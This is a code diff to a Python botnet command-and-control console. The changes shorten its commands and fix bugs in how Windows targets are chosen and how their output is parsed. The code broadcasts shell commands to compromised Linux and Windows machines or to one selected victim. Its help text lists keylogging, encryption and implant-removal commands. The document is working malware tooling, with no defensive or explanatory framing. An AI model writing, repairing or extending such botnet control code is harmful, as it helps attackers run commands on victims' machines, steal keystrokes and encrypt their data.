@@ -163,30 +163,30 @@ class BotnetCmdCtrl:
 		"""
 		cmd = input(GREEN + "[shell]$: " + RESET)
 		while True:
-			if cmd == 'quit':
+			if cmd == 'exit':
 				print(RED, "\nYou have closed all connections. Exiting program...", RESET)
 				self.server.close()
 				_exit(0)
 
-			elif cmd.strip() == 'ls linux':
+			elif cmd.strip() == 'ls lin':
 				if len(IP_ADDRESSES[0]) == 0:
-					print(RED, 'Warning:', RESET, 'There are no Linux connections to list...')
+					print(RED + 'Warning:' + RESET + 'There are no Linux connections to list...')
 				else:
 					for ip in IP_ADDRESSES[0]:
-						print(BLUE, IP_ADDRESSES[0].index(ip), RESET, ip)
+						print(BLUE + str(IP_ADDRESSES[0].index(ip) + RESET) + ' ' + ip)
 
-			elif cmd.strip() == 'ls windows':
+			elif cmd.strip() == 'ls win':
 				if len(IP_ADDRESSES[1]) == 0:
-					print(RED, 'Warning:', RESET, 'There are no Windows connections to list...')
+					print(RED +'Warning:' + RESET + 'There are no Windows connections to list...')
 				else:
 					for ip in IP_ADDRESSES[1]:
-						print(BLUE, IP_ADDRESSES[1].index(ip), RESET, ip)
+						print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' ' + ip)
 
-			elif cmd.strip() == 'cnt linux':
-				print(f'{PURPLE + str(LINUX_COUNT) + RESET} Linux targets.')
+			elif cmd.strip() == 'cnt lin':
+				print(f'{PURPLE + str(LINUX_COUNT) + RESET} Linux target.')
 
-			elif cmd.strip() == 'cnt windows':
-				print(f'{PURPLE + str(WINDOWS_COUNT) + RESET} Windows targets.')
+			elif cmd.strip() == 'cnt win':
+				print(f'{PURPLE + str(WINDOWS_COUNT) + RESET} Windows target.')
 
 			elif cmd[:3] == 'lin':
 				resp_list = self.send_cmd_all_linux(cmd[4:])
@@ -228,9 +228,9 @@ class BotnetCmdCtrl:
 				index = int(cmd[11:].strip())
 				self.send_cmd_linux_target(index)
 
-			elif cmd[:11] == 'select windows': # Select the Windows target to connect to.
-				index = int(cmd[12:].strip())
-				self.send_cmd_windows_target(int(index))
+			elif cmd[:10] == 'select win': # Select the Windows target to connect to.
+				index = int(cmd[11:].strip())
+				self.send_cmd_windows_target(index)
 
 			elif cmd.strip() == 'switch': # Swithing writing modes: to stdout only, to stdout and file.
 				self.output_to_file = not self.output_to_file
@@ -276,11 +276,12 @@ class BotnetCmdCtrl:
 				None
 		"""
 		response_list = []
-		for conn in WINDOWS_CONNS.values():
+		for ip, conn in WINDOWS_CONNS.items():
 			conn.send(cmd.encode(ENCODING))
 			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
 			response = response[2:-1]
 			response = response.replace('\\n', '\n')
+			response = response.replace('\r', '')
 			response_list.extend([ip, response])
 		return response_list
 	
@@ -323,7 +324,7 @@ class BotnetCmdCtrl:
 				None
 		"""
 		try:
-			target_ip = IP_ADDRESSES[0][ip_index]
+			target_ip = IP_ADDRESSES[1][ip_index]
 		except IndexError:
 			print(RED, 'Warning:', RESET, 'There are no Windows connections.')
 			return
@@ -343,6 +344,7 @@ class BotnetCmdCtrl:
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
+				resp = resp.replace('\\r', '')
 				print(resp)
 
 	def write_response_output(self, response: str, ip_addr: str):
@@ -383,10 +385,10 @@ class BotnetCmdCtrl:
 				None
 		"""
 		print(PURPLE, 'Commands in main session: ', RESET)
-		print(ORANGE, '  ls linux >', RESET, 'Lists all the Linux connections (IPs).')
-		print(ORANGE, '  ls windows >', RESET, 'Lists all the Windows connections (IPs).')
-		print(ORANGE, '  cnt linux >', RESET, 'Lists the amount of Linux connections (int).')
-		print(ORANGE, '  cnt windows >', RESET, 'Lists the amount of Windows connections (int).')
+		print(ORANGE, '  ls lin >', RESET, 'Lists all the Linux connections (IPs).')
+		print(ORANGE, '  ls win >', RESET, 'Lists all the Windows connections (IPs).')
+		print(ORANGE, '  cnt lin >', RESET, 'Lists the amount of Linux connections (int).')
+		print(ORANGE, '  cnt win >', RESET, 'Lists the amount of Windows connections (int).')
 		print(ORANGE, '  lin [command] >', RESET, 'Send command to all Linux machines.')
 		print(ORANGE, '  win [command] >', RESET, 'Send command to all Windows machines.')
 		print(ORANGE, '  select lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
@@ -399,7 +401,7 @@ class BotnetCmdCtrl:
 		print(ORANGE, '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
 		print(ORANGE, '  sh [command] >', RESET, 'Execute command on the host machine.')
 		print(ORANGE, '  clear >', RESET, 'Clear the screen.')
-		print(ORANGE, '  quit >', RESET, "Quit the program.", end='\n\n')
+		print(ORANGE, '  exit >', RESET, "Quit the program.", end='\n\n')
 		print(PURPLE, 'Commands when connected to target:', RESET)
 		print(ORANGE, '  back >', RESET, 'Return to the main session.')
 		print(RED, 'keylog and encrypt commands are also available during target connection.')
@@ -440,6 +442,5 @@ if __name__ == '__main__':
 	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
 		print(RED, "\nExiting program...", RESET)
 		server.close()
-		sleep(0.75)
+		sleep(0.50)
 		run(['reset'])
-
